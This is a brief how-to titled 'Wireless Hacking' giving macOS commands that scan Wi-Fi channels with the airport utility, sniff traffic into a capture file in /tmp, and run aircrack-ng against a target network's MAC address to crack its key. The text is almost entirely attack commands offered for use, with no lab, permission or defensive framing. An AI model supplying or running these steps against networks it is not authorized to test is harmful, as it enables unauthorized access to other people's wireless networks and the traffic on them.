Wireless Hacking

You can hack Wireless via aircrack-ng, in OS X ;

sudo airport -s Select the channel you will sniff.
sudo airport en0 or en1 sniff [CHANNEL] Start to sniff WiFi networks.
aircrack-ng -1 -a 1 -b [TARGET_MAC_ADDRESS] [CAP_FILE] [CAP_FILE] will be located in the /tmp/
